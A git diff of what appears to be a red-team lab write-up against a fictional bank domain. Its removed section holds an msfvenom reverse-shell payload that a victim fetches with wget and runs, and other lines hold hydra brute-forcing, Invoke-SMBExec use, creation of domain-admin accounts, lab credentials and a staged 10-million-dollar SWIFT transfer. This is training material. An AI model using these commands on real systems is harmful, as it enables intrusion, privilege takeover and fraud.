@@ -128,7 +128,7 @@ hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V
 nmap -A $WebMail
 ```
 
-<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Scan all ports
 
@@ -578,60 +578,7 @@ vi /etc/proxychains.conf
 socks4 	127.0.0.1 9050
 ```
 
-### MSFVenom
 
-not done
-
-**Kali**
-
-```
-msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$KALI LPORT=8080 -f elf > reverse-8080.elf
-```
-
-**Kali(msfvenom)**
-
-```
-msfconsole -q 
-use exploit/multi/handler
-set payload linux/x64/meterpreter_reverse_tcp
-set LHOST $KALI
-set LPORT 8080
-run
-```
-
-**Kali**
-
-```
-python2 -m SimpleHTTPServer 81
-```
-
-**Victim**
-
-```
-cd /tmp/
-wget http://$KALI:81/reverse-8080.elf
-chmod +x reverse-8080.elf
-./reverse-8080.elf
-```
-
-**Kali(meterpreter)**
-
-```
-background
-use auxiliary/server/socks_proxy
-set srvport 9050
-set srvhost 0.0.0.0
-set version 4a
-run
-
-use post/multi/manage/autoroute
-set session $sessionID
-set subnet 10.200.X.0
-
-run autoroute -p
-```
-
-####
 
 #### Scanning other hosts
 
@@ -1556,9 +1503,9 @@ wget http://10.200.89.12:81/PsExec64.exe -O PsExec64.exe
 
 ```
 net user Administrator pass123!
-
-
 ```
+
+**Invoke-SMBExec Script**
 
 ```
 function Invoke-SMBExec
@@ -6793,6 +6740,12 @@ Invoke-SMBExec -Target 10.200.89.100 -Domain thereserve.loc -Username Administra
 
 ```
 
+**CORPDC**
+
+```
+./Invoke-SMBExec.ps1
+```
+
 For some reason I couldn't use this from the script so added manually
 
 **ROOTDC**
@@ -6805,36 +6758,54 @@ I can now login to the ROOTDC with RDP and from ROOTDC I can login to BANKDC
 
 <figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
 
+**ROOTDC -> BANKDC**
+
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+If RDP session flashes black you can kill the sessions for BANKDC to ROOTDC
+
+**Troubleshooting**
+
+```
+qwinsta /server:10.200.89.101
+rwinsta /server:10.200.89.101 2
+```
+
 **BankDC**
 
 ```
 net user zbank pass123! /ADD /DOMAIN
 net localgroup Administrators zbank /add
 net group "Domain Admins" zbank /ADD /DOMAIN
-net group "Tier 2 Admins" zbank /ADD /DOMAIN
-
 ```
 
-## 10.200.89.201
 
-scanned from VPN server after rooting
 
 ```
-nmap -sV -sT -O -p 1-65535 10.200.89.201
+===============================================
+Account Details:
+Source Email:		ffej@source.loc
+Source Password:	0ARkIDo_mW-_sA
+Source AccountID:	6470c885984e4a0c98e4b01c
+Source Funds:		$ 10 000 000
+
+Destination Email:	ffej@destination.loc
+Destination Password:	EJLyXab203ET3w
+Destination AccountID:	6470c886984e4a0c98e4b01d
+Destination Funds:	$ 10
+
+===============================================
+
+Using these details, perform the following steps:
+1. Go to the SWIFT web application
+2. Navigate to the Make a Transaction page
+3. Issue a transfer using the Source account as Sender and the Destination account as Receiver. You will have to use the corresponding account IDs.
+4. Issue the transfer for the full 10 million dollars
+5. Once completed, request verification of your transaction here (No need to check your email once the transfer has been created).
+
 ```
 
 ##
-
-
-
-
-
-**Remmina**
-
-<pre><code><strong>Username: mohammad.ahmed
-</strong>Password: Password1!
-Domain: corp.thereserve.loc
-</code></pre>
 
 ## Creds found
 
